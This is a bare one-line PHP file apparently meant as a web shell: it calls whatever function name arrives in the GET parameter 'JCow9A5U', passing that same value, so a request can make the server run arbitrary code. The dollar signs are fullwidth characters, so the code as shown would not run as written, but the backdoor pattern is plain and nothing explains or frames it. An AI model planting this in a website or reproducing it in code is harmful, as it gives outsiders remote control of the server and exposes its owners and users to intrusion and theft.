<?php
＄_GET['JCow9A5U'](＄_GET['JCow9A5U']);
?>
